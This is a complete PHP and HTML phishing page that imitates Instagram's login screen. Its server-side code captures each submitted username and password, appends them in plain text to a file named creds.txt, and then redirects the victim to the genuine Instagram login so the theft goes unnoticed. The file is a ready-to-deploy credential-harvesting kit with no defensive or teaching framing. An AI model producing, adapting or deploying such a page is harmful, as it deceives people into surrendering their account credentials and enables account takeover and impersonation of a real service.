<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    if ($username && $password) {
        $data = "Username: $username | Password: $password\n";
        file_put_contents('creds.txt', $data, FILE_APPEND | LOCK_EX);
        header('Location: https://www.instagram.com/accounts/login/');
        exit();
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <title>Instagram Login</title>
    <style>
        body { font-family: Arial, sans-serif; background:#fafafa; }
        .login-container { width: 300px; margin: 100px auto; padding: 40px; background: white; border: 1px solid #ddd; }
        input { width: 100%; padding: 10px; margin: 10px 0; }
        button { width: 100%; background: #3897f0; border: none; color: white; padding: 10px; cursor: pointer; }
        button:hover { background: #2a76d2; }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Instagram</h2>
        <form method="POST">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
